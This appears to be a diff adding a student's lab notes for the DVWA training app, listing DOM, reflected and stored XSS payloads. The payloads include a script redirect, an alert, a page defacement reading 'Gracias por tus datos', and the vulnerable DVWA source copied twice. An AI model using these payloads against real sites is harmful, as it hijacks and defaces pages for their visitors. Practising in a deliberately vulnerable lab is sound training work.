@@ -1,0 +1,57 @@
+Dom1 / http://localhost/DVWA/vulnerabilities/xss_d/?default=%3Cscript%20lenhuage=%22javascript%22%3Ewindow.location=%22https://www.youtube.com/shorts/85p8DDDrDzo%22;%3C/script%3E
+Dom2 / 
+					if (document.location.href.indexOf("default=") >= 0) {
+						var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
+						document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
+						document.write("<option value='' disabled='disabled'>----</option>");
+					}
+					    
+					document.write("<option value='English'>English</option>");
+					document.write("<option value='French'>French</option>");
+					document.write("<option value='Spanish'>Spanish</option>");
+					document.write("<option value='German'>German</option>");
+                    document.write("<option value='Binario'>Binario</option>");
+				<script>
+					if (document.location.href.indexOf("default=") >= 0) {
+						var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
+						document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
+						document.write("<option value='' disabled='disabled'>----</option>");
+					}
+					    
+					document.write("<option value='English'>English</option>");
+					document.write("<option value='French'>French</option>");
+					document.write("<option value='Spanish'>Spanish</option>");
+					document.write("<option value='German'>German</option>");
+                    document.write("<option value='Binario'>Binario</option>");
+				</script>
+                <option value="English">English</option>
+                <option value="" disabled="disabled">----</option>
+                <option value="English">English</option>
+                <option value="French">French</option>
+                <option value="Spanish">Spanish</option>
+                <option value="German">German</option>
+                <option value="Binario">Binario</option>
+
+Reflected / <script> 
+alert('Haz sido hackeado')
+</script>
+
+<script> 
+document.body.innerHTML = ''; 
+document.body.style.backgroundColor = 'red';
+var imagen = document.createElement('img');
+imagen.crossOrigin = 'anonymous';
+imagen.src = 'https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExbW0xNmx3bHNnbW9oOWhldWNuN3ZrZG92czVpYXlvOGF5eWxkNGNzbCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/gLQ69hVCxAou2y5Xxf/giphy.gif';
+imagen.width = 300;
+document.body.appendChild(imagen);
+var titulo = document.createElement('h1');
+titulo.textContent = 'Gracias por tus datos';
+titulo.style.color = 'white';
+document.body.appendChild(titulo);
+</script>
+
+Stored / <img src="https://dtb3yzl0vm3pr.cloudfront.net/gallery/album_256/gallery_11310_256_11549.jpg"
+alt="Nelson" />
+
+
+Stored2 / <SCRIPT language="javascript">window.location="http://google.com";</SCRIPT>
